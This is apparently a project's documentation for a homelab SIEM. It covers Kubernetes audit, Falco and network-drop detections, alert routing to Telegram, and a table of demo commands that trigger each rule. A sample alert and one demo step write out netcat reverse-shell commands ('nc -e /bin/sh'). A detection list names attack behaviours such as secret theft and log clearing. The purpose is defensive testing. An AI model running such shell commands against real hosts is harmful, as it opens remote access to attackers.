# Simple SIEM

The homelab has no separate SIEM product. Four event sources feed the same log, metric and alert pipeline,
and every detection ends up as an Alertmanager alert that goes to Telegram and to the AI alert agent.

## Sources and pipeline

| Source | Collected by | Stored in | Detected by |
|---|---|---|---|
| Kubernetes API server audit log (`/var/log/kubernetes/audit.log` on the server node) | Alloy `alloy-audit` (server node only) | Loki, `job="k8s-audit"` | Loki ruler |
| Falco runtime events (syscalls in containers) | Falco, falcosidekick | Loki | Loki ruler over the Falco stream (falcosidekick's Alertmanager output is off) |
| Hubble network flow drops | Cilium agent metrics | Prometheus | Prometheus rule |
| App error logs and 5xx spans | Alloy (pod logs, OTLP) | Loki, Prometheus, Tempo | Loki ruler, Prometheus rule |

```
audit.log ──► Alloy ──► Loki ──► Loki ruler ─────────┐
pod logs ───► Alloy ──► Loki ──► Loki ruler ─────────┤
OTLP spans ─► Alloy ──► span metrics ► Prometheus ───┼──► Alertmanager ──► Telegram
Hubble ─────► Prometheus ────────────────────────────┤                └──► alert-agent webhook
Falco ──► falcosidekick ──► Loki ──► Loki ruler ─────┘
```

Alertmanager groups by `alertname, rule_ref, rule, namespace, k8s_ns_name, service`, waits 30 s, repeats every 4 h and
sends resolved notifications. Both receivers use `continue: true`, so a missing `alert-agent` never blocks Telegram.

## Detection rules

| Rule | Source | Severity | Protected |
|---|---|---|---|
| `Http5xxRate` (5xx per service and route, 2 m, for 1 m) | Prometheus | critical | no |
| `PodRestartingFrequently` (3 restarts in 10 m) | Prometheus | warning | no |
| `DeploymentReplicasMissing` (3 m here, 15 m in production) | Prometheus | warning | no |
| `PodOOMKilled` | Prometheus | warning | no |
| `HubblePolicyDrops` (policy-denied rate above 0 for 2 m) | Prometheus | warning | no |
| `AppErrorLogs` (more than 5 error lines in 2 m) | Loki | warning | no |
| `NodeMemoryHigh` (above 85 %) | Prometheus | warning | yes |
| `NodeNotReady` | Prometheus | critical | yes |
| `PersistentVolumeAlmostFull` | Prometheus | warning | yes |
| `CertificateExpiringSoon` (needs cert-manager metrics) | Prometheus | warning | yes |
| `ServiceRollingOut` (a `shop` Deployment is rolling out, plus 2 m grace; severity `none`, routed to a null receiver, only inhibits) | Prometheus | none | no |
| Audit, Falco and app-auth rules | Loki | see the mapping table below | yes |

Protected rules carry `protected="true"`: the agent must never auto-close them. Every Loki rule below also carries
`rule_ref` (the production rule number it mirrors) and, where the production rule had one, `mitre`.

Audit alerts carry `user`, `verb`, `resource`, `namespace` and `source_ip`, lifted from the audit JSON. `user` is the
impersonated identity when the request used `--as`, so a test with `kubectl --as=system:serviceaccount:...` is judged as that
ServiceAccount (the audit `user` field alone would say `system:admin`).

## Production rule to homelab rule

Same tiering as production: Wazuh level 10 and above pages the chat (`protected="true"`), lower levels stay queryable in Loki
only. Two deliberate deviations: the homelab pages Warning-tier items (exec by a human, Falco Warning) as `warning` because the
demo wants them visible, and `system:admin` is the deployer here, so its writes are info only.

| rule_ref | What | Homelab rule | Severity | Protected |
|---|---|---|---|---|
| 100211 | ServiceAccount exec/attach/portforward into a Pod | `AuditExecByServiceAccount` | high | yes |
| 100201 | Human exec/attach/portforward into a Pod | `AuditExecByUser` | warning | yes |
| 100202 | RBAC create/update/patch/delete, non-controller (garbage collector patch/delete exempt, 100225) | `AuditRBACChange` | high | yes |
| 100202 | Same, by `system:admin` (helm patches RBAC) | `AuditRBACChangeByAdmin` | warning | yes |
| 100203 | NetworkPolicy / CiliumNetworkPolicy change, non-controller, not `system:admin` | `AuditNetworkPolicyChange` | warning | yes |
| 100210 (+100221) | ServiceAccount list/watch Secrets outside known controllers | `AuditSecretsListByServiceAccount` | critical | yes |
| 100204 | Other identity list/watch Secrets (2xx) outside known controllers | `AuditSecretsListByUser` | high | yes |
| 100209 | `system:admin` list/watch Secrets (admin debug) | no alert, stays in Loki | n/a | n/a |
| 100205 + 100216 | Workload/config write in `shop` outside the deploy pipeline (`system:admin` is the pipeline: info) | `AuditShopWriteOutsidePipeline` | warning | yes |
| 100206 + 100207 | 403 at least 10 times in 2 m for one user (permission probing) | `AuditPermissionProbing` | high | yes |
| 100208 | Anonymous request accepted (health and discovery paths excluded) | `AuditAnonymousAccepted` | critical | yes |
| 100212 | Workload with hostPath, privileged, hostPID, hostNetwork, hostIPC or SYS_ADMIN (request body) | `AuditHostAccessWorkload` | critical | yes |
| 100212 (fallback) | Pod Security admission rejected the request (403 with the `enforce-policy` annotation) | `AuditPodSecurityDenied` | high | yes |
| 100102 | Falco Warning, not in a list below | `FalcoWarning` | warning | yes |
| 100103 | Falco Error, Critical, Alert, Emergency, not in a list below | `FalcoCritical` | critical | yes |
| 100101 | Falco Notice | no alert, stays in Loki | n/a | n/a |
| 100214 | Attack-behaviour list (netcat RCE, stdio to network, private-key search, release_agent, kernel module, debugfs, ptrace, /dev/shm exec, memfd, clear logs, bulk delete, symlink/hardlink over sensitive files, packet socket, AWS credentials), any priority | `FalcoAttackBehaviour` | critical | yes |
| 100215 | Run shell untrusted, Contact K8S API Server From Container | no alert, stays in Loki | n/a | n/a |
| 100110 | Terminal shell in container (T1059.004) | `FalcoTerminalShell` | warning | yes |
| 100111 | Read sensitive file (T1003.008) | `FalcoReadSensitiveFile` | high | yes |
| 100112 | Drop and execute new binary in container (T1105) | `FalcoNewBinaryExecuted` | critical | yes |
| 100233 + 100234 | 5 or more 401/403 in 10 m on one route (and client IP when logged) | `AppAuthFailures` | high | yes |

Falco goes through the ruler instead of falcosidekick's `alertmanager.minimumpriority`: a priority threshold cannot express
"this rule is critical whatever its priority" or "this rule never pages", so one place (`loki-rules.yaml`) owns the tier.

### Known controllers (derived from the real audit log)

Secret list/watch seen in this cluster within an hour: `system:apiserver`, `system:k3s-supervisor`, `system:node:*`,
kube-system ServiceAccounts (Cilium and its operator), `kps-operator`, `loki`. The allow-list is those plus the ServiceAccounts
of Grafana, Alloy, Tempo and Falco; `helm` runs as `system:admin`, which no longer alerts (this removed the false positives
"Secrets get/list by system:admin in namespace 'falco'").

### Known gaps

- **Audit policy.** `platform/k3d/audit-policy.yaml` logs at Metadata everything except built-in control-plane identities, nodes,
  kube-system ServiceAccounts and noisy resources, so 403s, anonymous access, NetworkPolicy and workload writes are visible.
  Those excluded identities are therefore blind spots (a stolen kube-system token is not detected). The policy is read only when
  kube-apiserver starts: after editing it, restart the server node (`docker restart k3d-homelab-server-0`, then re-run the bpffs
  mounts from `scripts/up.sh` and restart `k3d-homelab-serverlb`) or recreate the cluster.
- **100212 body.** Metadata level has no request body, so `shop` workloads (pods, Deployments, StatefulSets, DaemonSets,
  ReplicaSets, Jobs, CronJobs) are logged at Request level; that is cheap because only create/update/patch in one namespace
  is covered. Other namespaces are covered only by the Pod Security fallback (`AuditPodSecurityDenied`). `system:admin`
  is excluded from `AuditHostAccessWorkload`, as in production, because helm legitimately installs hostPath DaemonSets.
- **Secret get.** Only list/watch alert, as in production; a stolen token doing `get secret/<name>` does not.
- **App brute force.** The sample apps log no `client_ip`, so `AppAuthFailures` groups by app and route. None of them has a
  login route yet; the rule fires once one returns 401/403 five times in 10 m, and the client IP appears when an app logs `client_ip`.
- **Falco host noise.** Falco reads containerd image unpacking as "Clear Log Activities"; events under
  `/var/lib/rancher/k3s/agent/containerd/` are excluded in the Falco rules.
- **Grafana exemption.** `FalcoAttackBehaviour` skips the `kps-grafana-*` pod (its plugin opens a packet socket at start).
- **Falco labels.** Falco events carry no `mitre` label except the three rules above (the technique is in the Loki `tags` label).
- **MITRE for brute force.** `T1110` on `AppAuthFailures` is an addition; production had none on 100233/100234.

## Telegram message

The template is `platform/observability/telegram.tmpl` (HTML parse mode, Vietnamese labels, at most 5 alerts per message,
then `+N cảnh báo nữa`). Summaries are cut at 200 characters, descriptions at 160, other fields shorter, and `<>&"'` are
replaced by a dot (HTML escaping would expand them up to 6 times and break Telegram's 4096 limit). With 30 alerts of maximum
field length the render is about 3.2k characters. Sample render:

```
🚨 🛡️ <b>CRITICAL</b> · loki-audit
🎯 <b>ServiceAccount system:serviceaccount:demo:probe list Secrets in namespace ·demo·: the token in a pod may be stolen</b>
📍 demo/k8s-audit
👤 system:serviceaccount:demo:probe · list secrets
🌐 172.18.0.1
🔒 Bảo mật — không tự đóng
🕒 07/11 08:03:00

🚨 🛡️ <b>CRITICAL</b> · falco
🎯 <b>Falco attack behaviour: Netcat Remote Code Execution in Container</b>
📍 shop/catalog-api-7d9
⚙️ <code>nc -e /bin/sh 10.0.0.1 4444</code>
🔒 Bảo mật — không tự đóng
🕒 07/11 08:03:00
```

Rollouts: `ServiceRollingOut` (severity `none`, routed to a null receiver) fires while a `shop` Deployment rolls out and for 2 m
after. An Alertmanager inhibit rule mutes `Http5xxRate`, `PodRestartingFrequently`, `DeploymentReplicasMissing` and
`AppErrorLogs` with the same `namespace` and `service` (the Deployment name) during that time.

Re-render after editing the template (amtool version must match the chart's Alertmanager, v0.34.2):

```bash
docker run --rm -v "$PWD/platform/observability:/w:ro" --entrypoint amtool prom/alertmanager:v0.34.2 \
  template render --template.glob='/w/*.tmpl' --template.text='{{ template "telegram.homelab" . }}' \
  --template.data=/w/sample.json
```

## Demo: trigger each detection

Port-forward first (see the end of `scripts/platform.sh` output). Alerts show up in Telegram after the group wait (30 s).

| Rule | How to trigger |
|---|---|
| `AuditExecByUser` (warning) | `kubectl -n shop exec deploy/catalog-api -- sh` as admin |
| `AuditExecByServiceAccount` (high) | same exec with `--as=system:serviceaccount:shop:<sa>` |
| `AuditSecretsListByServiceAccount` (critical) | create a ServiceAccount and a Role allowing `list` on secrets in a temp namespace, then `kubectl -n <ns> get secrets --as=system:serviceaccount:<ns>:<sa>` |
| `AuditSecretsListByUser` | list Secrets as a non-admin identity that is not a controller (for example a client-certificate user); `kubectl get secrets` as `system:admin` must NOT alert |
| `AuditRBACChange` / `...ByAdmin` | create a Role (admin gives the warning variant; `--as=<other user>` with permission gives high) |
| `AuditNetworkPolicyChange` | change a NetworkPolicy in `shop` as a non-admin identity allowed to (re-apply `deploy/network-policies.yaml` after) |
| `AuditShopWriteOutsidePipeline` | `kubectl -n shop scale deploy/orders-api --replicas=2 --as=<non-admin user allowed to>`; as `system:admin` it must NOT alert |
| `AuditPermissionProbing` | run `kubectl get pods -A --as=system:serviceaccount:default:default` ten times within 2 minutes |
| `AuditAnonymousAccepted` | needs the API server to accept an anonymous request (for example a RoleBinding to `system:anonymous`) |
| `AuditPodSecurityDenied` | `kubectl -n shop run x --image=busybox:1.37 --privileged --dry-run=server` (denied by Pod Security `restricted`) |
| `AuditHostAccessWorkload` | create a Deployment with a hostPath volume in `shop` as a non-admin identity allowed to |
| `FalcoTerminalShell` | same `kubectl exec` as above |
| `FalcoAttackBehaviour` | in a throwaway pod that has netcat, run `nc -e /bin/sh 127.0.0.1 1` |
| `AppAuthFailures` | needs a route that answers 401/403; call it five times within 10 minutes |
| `ServiceRollingOut` | `kubectl -n shop rollout restart deploy/catalog-api`, then hit `/fault/500`: `Http5xxRate` shows `inhibitedBy` in Alertmanager |
| `Http5xxRate` | `curl http://<catalog-api>/fault/500` repeatedly, or `POST /fault/error-rate` |
| `PodRestartingFrequently` | `POST /fault/crash` on a backend three times |
| `PodOOMKilled` | `POST /fault/oom` |
| `DeploymentReplicasMissing` | `kubectl -n shop scale deploy/orders-api --replicas=0`, then image pull errors or node drain; fires after 3 m |
| `HubblePolicyDrops` | `kubectl -n shop exec deploy/shop-web -- wget -T2 -qO- http://postgres:5432` (blocked by the default-deny policy) |
| `NodeMemoryHigh` | raise node memory above 85 %, for example a large `stress` pod with a high request |
| `AppErrorLogs` | `GET /fault/500` more than 5 times in 2 minutes |

`HubblePolicyDrops` shows namespaces only if the Cilium Hubble `drop` metric is configured with
`labelsContext=source_namespace,destination_namespace`; without it the alert still fires.

## Grafana access

Grafana: `kubectl -n observability port-forward svc/kps-grafana 3001:80`, user `admin`, password from
`GRAFANA_ADMIN_PASSWORD` in `.env` (or the generated `grafana-admin` Secret).

Viewer service account for the agent (read-only, created once by an admin):

```bash
curl -s -u admin -H 'Content-Type: application/json' -X POST http://localhost:3001/api/serviceaccounts \
  -d '{"name":"alert-agent","role":"Viewer"}'
# then POST /api/serviceaccounts/<id>/tokens and store the token as GRAFANA_SA_TOKEN in .env
```

Traces link to logs through `trace_id` (Loki derived field and Tempo `tracesToLogsV2`).

## Falco driver

Falco uses the `modern_ebpf` driver with least privilege (capabilities BPF, PERFMON, SYS_RESOURCE, SYS_PTRACE).
It needs a kernel with BTF and ring buffer support (5.8+), which the Docker Desktop WSL2 kernel normally has.
If the pods crash with a driver error, `scripts/platform.sh` stops and does not fall back on its own.
Check `kubectl -n falco logs ds/falco -c falco`, then pick one explicitly in `platform/falco/values.yaml`:
`driver.modernEbpf.leastPrivileged: false` (privileged container) or `driver.kind: kmod` (needs kernel headers,
usually unavailable on WSL2). Without a working driver the Falco source of this SIEM is down.

## RAM budget (requests)

| Component | Requests | Limit |
|---|---|---|
| Prometheus | 400 Mi | 800 Mi |
| Alertmanager, operator, kube-state-metrics | 128 Mi | 256 Mi |
| node-exporter (3 nodes) | 48 Mi | 96 Mi |
| Grafana + sidecars | 214 Mi | 428 Mi |
| Loki + rules sidecar | 288 Mi | 576 Mi |
| Tempo | 128 Mi | 256 Mi |
| Alloy (3 nodes, with reloader) | 432 Mi | 864 Mi |
| Alloy audit (server node) | 80 Mi | 160 Mi |
| Falco (3 nodes) | 576 Mi | 1536 Mi |
| falcosidekick | 32 Mi | 64 Mi |
| **Total** | **about 2.3 GiB** | **about 5 GiB** |

Everything runs single-replica with emptyDir storage: data is lost when a pod is replaced and retention is
2 days (metrics) or 3 days (logs, traces).
